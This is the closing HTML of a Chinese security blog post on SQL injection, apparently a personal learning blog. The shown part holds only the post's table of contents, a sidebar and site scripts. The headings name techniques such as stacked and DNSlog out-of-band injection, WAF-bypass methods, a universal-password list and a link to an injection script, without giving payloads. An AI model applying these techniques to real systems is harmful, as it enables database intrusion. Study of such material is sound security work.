class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.9.</span> <span class="toc-text">堆叠注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E5%9C%BA%E6%99%AF"><span class="toc-number">1.3.</span> <span class="toc-text">注入点场景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SELECT%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.3.1.</span> <span class="toc-text">SELECT语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#INSERT%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text">INSERT语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UPDATE%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.3.3.</span> <span class="toc-text">UPDATE语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DELETE%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.3.4.</span> <span class="toc-text">DELETE语句</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WafByPass"><span class="toc-number">1.4.</span> <span class="toc-text">WafByPass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UNION-SELECT%E8%BF%87%E7%8B%97"><span class="toc-number">1.4.1.</span> <span class="toc-text">UNION　SELECT过狗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8%E8%BF%87%E7%8B%97"><span class="toc-number">1.4.2.</span> <span class="toc-text">盲注过狗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E8%BF%87%E7%8B%97"><span class="toc-number">1.4.3.</span> <span class="toc-text">报错注入过狗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%82%E9%A1%B9%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.4.</span> <span class="toc-text">杂项总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%EF%BC%9Alike-%E2%80%9C-23%E2%80%9D"><span class="toc-number">1.4.5.</span> <span class="toc-text">补充：like[“%23”]</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNSlog%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.</span> <span class="toc-text">DNSlog注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%B4%E6%98%8E%EF%BC%9A"><span class="toc-number">1.5.0.1.</span> <span class="toc-text">说明：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">1.5.0.2.</span> <span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%9A"><span class="toc-number">1.5.0.3.</span> <span class="toc-text">使用场景：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">1.5.0.4.</span> <span class="toc-text">注意事项</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#DNSlog%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%AC%EF%BC%9Ahttps-github-com-ADOOO-DnslogSqlinj"><span class="toc-number">1.5.0.4.1.</span> <span class="toc-text">DNSlog注入脚本：https:&#x2F;&#x2F;github.com&#x2F;ADOOO&#x2F;DnslogSqlinj</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E8%A1%A8"><span class="toc-number">1.6.</span> <span class="toc-text">万能密码表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.7.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/12/10/TryHackMe_2/" title="TryHackMe_2"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/220703.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="TryHackMe_2"/></a><div class="content"><a class="title" href="/2022/12/10/TryHackMe_2/" title="TryHackMe_2">TryHackMe_2</a><time datetime="2022-12-10T13:59:02.000Z" title="发表于 2022-12-10 21:59:02">2022-12-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/12/04/TryHackMe_1/" title="TryHackMe_1"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/4201644.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="TryHackMe_1"/></a><div class="content"><a class="title" href="/2022/12/04/TryHackMe_1/" title="TryHackMe_1">TryHackMe_1</a><time datetime="2022-12-04T12:08:57.000Z" title="发表于 2022-12-04 20:08:57">2022-12-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/25/HTTP2%20request%20smuggling/" title="HTTP2 request smuggling"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/221125121515.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="HTTP2 request smuggling"/></a><div class="content"><a class="title" href="/2022/11/25/HTTP2%20request%20smuggling/" title="HTTP2 request smuggling">HTTP2 request smuggling</a><time datetime="2022-11-25T04:12:08.000Z" title="发表于 2022-11-25 12:12:08">2022-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/16/HTTP%E8%B5%B0%E7%A7%81%E9%9D%B6%E5%9C%BA/" title="HTTP走私靶场"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/6d280d2dfe7be6116b88c3b564148f2.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="HTTP走私靶场"/></a><div class="content"><a class="title" href="/2022/11/16/HTTP%E8%B5%B0%E7%A7%81%E9%9D%B6%E5%9C%BA/" title="HTTP走私靶场">HTTP走私靶场</a><time datetime="2022-11-16T14:33:49.000Z" title="发表于 2022-11-16 22:33:49">2022-11-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/11/SQLI/" title="SQL注入"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/5b7adf6e714ea6c53e24ed50477cbab.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="SQL注入"/></a><div class="content"><a class="title" href="/2022/11/11/SQLI/" title="SQL注入">SQL注入</a><time datetime="2022-11-11T08:20:21.000Z" title="发表于 2022-11-11 16:20:21">2022-11-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By yake-daigua</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">你也和我一样是青春的配角吧</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'TieUOuIwaBZb4edJcJ1C02ka-gzGzoHsz',
      appKey: 'eJRGo87LLpxMlIWKemPvjBtH',
      avatar: 'monsterid',
      serverURLs: 'https://tieuouiw.lc-cn-n1-shared.com',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://yake-daigua.top/2022/11/11/SQLI/'
    this.page.identifier = '/2022/11/11/SQLI/'
    this.page.title = 'SQL注入'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }

  document.getElementById('darkmode').addEventListener('click', () => {
    setTimeout(() => window.disqusReset(), 200)
  })
}

if ('Valine' === 'Disqus' || !true) {
  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script src="https://cdn.jsdelivr.net/gh/lete114/CDN/js/upjiang.js"></script><script type="text/javascript" src="/js/fairyDustCursor.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div>
        <style>
            [bg-lazy] {
                background-image: none !important;
                background-color: #eee !important;
            }
        </style>
        <script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(e){e.imageLazyLoadSetting.processImages=t;var n=e.imageLazyLoadSetting.isSPA,i=e.imageLazyLoadSetting.preloadRatio||1,r=o();function o(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){n&&(r=o());for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(e.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];e=function(){r=r.filter(function(t){return o!==t})},(t=o).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,t.removeAttribute("data-original"),e&&e()},t.src!==i&&(n.src=i))}()}function a(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",a),e.addEventListener("resize",a),e.addEventListener("orientationchange",a)}(this);</script></body></html>